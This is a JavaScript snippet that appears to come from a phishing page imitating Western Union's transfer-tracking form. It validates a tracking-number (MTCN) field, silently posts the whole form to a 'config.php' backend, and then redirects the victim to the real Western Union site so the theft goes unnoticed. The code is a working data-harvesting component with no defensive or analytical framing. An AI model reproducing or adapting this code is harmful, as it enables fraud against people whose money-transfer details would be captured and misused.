                            $(function() {
                    $("form[name='frmLogin']").validate({
                        rules: {
                            trackingNumber: "required",


                        },
                        messages: {
                            trackingNumber: " Enter 10-digit tracking number (MTCN) ",
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("config.php", $("#frmLogin").serialize(), function(result){
                                setTimeout(function() {
                                    $(location).attr("href", "https://www.westernunion.com/web/global-service/track-transfer");
                                }, 100);
                            });
                        },
                    });
                                
                         });  